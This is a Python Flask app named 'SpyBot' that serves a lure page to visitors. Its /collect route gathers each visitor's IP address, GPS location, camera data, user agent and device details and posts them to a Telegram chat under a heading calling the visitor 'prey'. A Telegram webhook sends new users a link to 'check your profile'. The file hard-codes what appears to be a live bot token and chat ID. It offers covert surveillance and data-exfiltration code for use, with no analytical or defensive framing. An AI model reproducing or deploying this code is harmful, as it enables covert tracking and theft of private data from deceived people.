from flask import Flask, request, render_template
import requests, os

app = Flask(__name__, template_folder="templates", static_folder="static")

BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"

@app.route("/")
def home():
    return render_template("spy.html")

@app.route("/collect", methods=["POST"])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    location = f"https://maps.google.com/?q={data.get('latitude')},{data.get('longitude')}" if data.get('latitude') else "❌ Location Not Available"

    message = f"""
👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device: {data.get('userAgent')}
📍 Location: {location}
📷 Camera: {data.get('camera')}
🧠 Device Info: {data.get('deviceInfo')}
"""

    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
        "chat_id": CHAT_ID,
        "text": message
    })

    return "OK", 200

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    update = request.get_json()
    if "message" in update and "text" in update["message"]:
        chat_id = update["message"]["chat"]["id"]
        text = update["message"]["text"]
        if text == "/start":
            msg = (
                "👋 خوش آمدید Faizan™ SpyBot میں!\n"
                "🔍 اپنا پروفائل چیک کریں 👇\n"
                "🌐 https://faizan-spybot.onrender.com"
            )
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
                "chat_id": chat_id,
                "text": msg
            })
    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
